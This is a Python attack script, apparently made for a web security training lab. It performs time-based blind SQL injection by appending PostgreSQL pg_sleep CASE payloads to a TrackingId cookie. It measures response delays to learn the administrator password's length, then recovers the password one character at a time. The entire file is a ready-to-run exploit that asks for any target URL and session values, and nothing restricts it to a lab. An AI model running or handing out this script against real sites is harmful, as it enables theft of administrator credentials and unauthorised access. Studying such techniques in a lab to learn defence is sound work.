import requests
import string
import time

# 👉 Input from user
url = input("🔗 Enter target URL (with ?category=...): ").strip()
base_tracking_id = input("🍪 Enter TrackingId value: ").strip()
session_id = input("🔐 Enter Session ID: ").strip()

# Characters to test
characters = string.ascii_lowercase + string.digits + string.ascii_uppercase

# Function to find password length
def get_length():
    print("\n[*] Finding password length using time-based SQLi...")
    for i in range(1, 51):
        payload = f"'|| CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')) = {i}) THEN pg_sleep(10) ELSE pg_sleep(0) END ||'"
        cookies = {
            'TrackingId': base_tracking_id + payload,
            'session': session_id
        }
        start = time.time()
        r = requests.get(url, cookies=cookies)
        elapsed = time.time() - start
        print(f"Trying length {i} - Response Time: {round(elapsed, 2)}s")
        if elapsed > 4.5:
            print(f"[+] Password length found: {i}")
            return i
        time.sleep(0.2)
    print("[-] Could not determine length.")
    return 0

# Function to extract password character by character
def get_password(length):
    print("[*] Extracting password using time-based SQLi...")
    password = ""
    for i in range(1, length + 1):
        for char in characters:
            payload = f"'|| CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1) = '{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END ||'"
            cookies = {
                'TrackingId': base_tracking_id + payload,
                'session': session_id
            }
            start = time.time()
            r = requests.get(url, cookies=cookies)
            elapsed = time.time() - start
            print(f"Trying position {i}: {char} - Time: {round(elapsed, 2)}s", end="\r")
            if elapsed > 10.0:
                password += char
                print(f"\n[+] Found character {i}: {char}")
                break
            time.sleep(0.2)
    return password

# Start the attack
length = get_length()
if length > 0:
    password = get_password(length)
    print(f"\n✅ Administrator Password: {password}")
else:
    print("✖️ Could not determine password length.")
